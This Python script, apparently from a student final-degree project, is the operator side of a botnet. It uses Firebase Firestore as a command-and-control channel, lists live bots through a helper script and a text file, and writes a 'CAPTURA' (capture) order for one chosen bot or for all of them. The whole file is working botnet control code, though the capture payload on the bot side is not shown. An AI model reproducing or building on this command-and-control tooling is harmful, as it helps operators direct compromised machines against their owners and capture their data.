import os
import firebase_admin
from firebase_admin import credentials, firestore# initialize sdk
from datetime import datetime

cred = credentials.Certificate("tfg-nicolas-cea-firebase-adminsdk-bq588-0a7759e31d.json")

firebase_admin.initialize_app(cred)# initialize firestore instance

firestore_db = firestore.client()# add data

now = datetime.now()
dt_string = now.strftime("%d-%m-%Y %H:%M:%S")

# Escribe una orden para la botnet
os.system("python3 botsVivos.py")
lista = []
with open ("availableBots.txt", "r") as myfile:
    lines = myfile.readlines()
    newline = lines[0].replace(" \n","")
    lista = newline.split(";")

print(lista)

botEscogido = input("Select a bot or leave empty to set a permanent order: ")
if(botEscogido == ""):
    botEscogido = 'todos'
if botEscogido in lista or botEscogido == "todos":
    firestore_db.collection(u'ordenes').document('captura ' + dt_string).set({'Primitiva': 'CAPTURA', 'Bot_ID': botEscogido})
else:
    print("El bot seleccionado no está disponible")